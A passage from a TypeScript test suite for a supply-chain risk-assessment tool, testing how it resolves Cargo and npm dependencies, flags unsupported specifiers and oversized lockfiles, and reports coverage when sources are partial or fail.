      { path: "Cargo.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "Cargo.toml": "[package]\nname = \"app\"\nversion = \"0.1.0\"\n[dependencies]\nserde_alias = { package = \"serde\", version = \"1\" }\n",
      "Cargo.lock": "version = 3\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\ndependencies = [\"serde\"]\n[[package]]\nname = \"serde\"\nversion = \"1.0.219\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n"
    });
    expect(renamed.dependencies.exact).toEqual([{ ecosystem: "CARGO", name: "serde", version: "1.0.219", sourcePath: "Cargo.lock", manifestPath: "Cargo.toml", workspacePath: "." }]);
  });

  test("excludes non-registry NPM specifiers and reports unsupported requirements explicitly", async () => {
    const evidence = await realGithubEvidence([{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }], {
      "package.json": JSON.stringify({ dependencies: {
        local: "workspace:*",
        linked: "portal:../linked",
        gitDep: "git+https://github.com/acme/gitDep.git",
        remote: "https://example.com/remote.tgz",
        alias: "npm:real-package@1.2.3",
        githubShort: "owner/repo#main"
      } })
    });
    expect(evidence.dependencies.exact).toEqual([]);
    expect(evidence.dependencies.unresolved.map(item => item.name).sort()).toEqual(["alias", "gitDep", "githubShort", "remote"]);
    expect(evidence.coverage.limitations).toEqual(expect.arrayContaining([
      "dependency_specifier_unsupported:package.json:alias",
      "dependency_specifier_unsupported:package.json:gitDep",
      "dependency_specifier_unsupported:package.json:githubShort",
      "dependency_specifier_unsupported:package.json:remote"
    ]));
    expect(evidence.dependencyResolution?.applicableExternalDependencyCount).toBe(evidence.dependencies.exact.length + evidence.dependencies.unresolved.length);
  });

  test("classifies every requirements variant as unsupported PyPI", async () => {
    const evidence = await realGithubEvidence([{ path: "requirements-prod.txt", type: "blob", sha: packageBlob, size: 100 }], { "requirements-prod.txt": "requests==2.0.0\n" });
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
    expect(evidence.dependencyResolution?.unsupportedEcosystems).toEqual(["PYPI"]);
  });

  test("bounds dependency files above the 2 MiB budget and keeps metadata counts consistent when lock content is unavailable", async () => {
    const oversizedLock = "x".repeat(2 * 1024 * 1024 + 1);
    const oversized = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: oversizedLock.length }
    ], { "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }), "package-lock.json": oversizedLock });
    expect(oversized.dependencies.exact).toEqual([]);
    expect(oversized.coverage.limitations).toContain("dependency_file_oversized:package-lock.json");
    expect(oversized.dependencyResolution?.applicableExternalDependencyCount).toBe(oversized.dependencies.exact.length + oversized.dependencies.unresolved.length);

    const unavailable = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], { "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }) });
    expect(unavailable.dependencies.exact).toEqual([]);
    expect(unavailable.dependencies.unresolved).toHaveLength(1);
    expect(unavailable.dependencyResolution?.applicableExternalDependencyCount).toBe(unavailable.dependencies.exact.length + unavailable.dependencies.unresolved.length);
  });

  test("keeps partial-tree exact subsets unknown and attributes mixed supported/unsupported execution", async () => {
    const partialEvidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }),
      "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": { dependencies: { demo: "^1.0.0" } }, "node_modules/demo": { version: "1.2.0" } } })
    }, true);
    expect(partialEvidence.dependencies.exact).toHaveLength(1);
    const partialAssessment = await repositoryOmni(partialEvidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(partialAssessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(partialAssessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(partialAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(partialAssessment.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const mixedEvidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "go.mod", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }),
      "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": { dependencies: { demo: "^1.0.0" } }, "node_modules/demo": { version: "1.2.0" } } }),
      "go.mod": "module example.com/demo\n"
    });
    const mixedAssessment = await repositoryOmni(mixedEvidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(mixedAssessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("propagates mixed real dependency resolution uncertainty to downstream sources", async () => {
    const lock = JSON.stringify({ lockfileVersion: 3, packages: { "": { dependencies: { resolved: "^1.0.0", unresolved: "^2.0.0" } }, "node_modules/resolved": { version: "1.2.3" } } });
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { resolved: "^1.0.0", unresolved: "^2.0.0" } }),
      "package-lock.json": lock
    });
    const depsDevCalls: string[] = [];
    const threatIntelCalls: string[] = [];
    const depsDev = fakeDepsDev(coordinate => { depsDevCalls.push(coordinate.name); });
    const assessment = await repositoryOmni(evidence, threatIntelStore(async coordinate => {
      threatIntelCalls.push(coordinate.name);
      return { checked: true, findings: [] };
    }), new NoopAssessmentJournal(), staticScorecard, undefined, depsDev).repositoryRisk("acme", "demo");

    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(depsDevCalls).toEqual(["resolved"]);
    expect(threatIntelCalls).toEqual(["resolved"]);
  });

  test("maps a real GitHub collection failure to unavailable", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = {
      async request(url: string | URL) {
        const target = String(url);
        if (target === base) return response({ full_name: "acme/demo", default_branch: "main" });
        if (target === `${base}/commits/main`) return response({ sha: commitSha, commit: { tree: { sha: treeSha } } });
        return response({ message: "upstream unavailable" }, 503);
      }
    };
    const provider = new GitHubRepositoryProvider(http as never);
    const identity = await provider.resolve("acme", "demo");
    const github = {
      async resolve() { return identity; },
      async collectResolved() { return provider.collectResolved("acme", "demo", identity); }
    };
    const assessment = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, github).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 });
    expect(assessment.sourceErrors).toContain("GitHub: github_http_503");
  });
});

const MAX_STREAM_BYTES = 2 * 1024 * 1024;
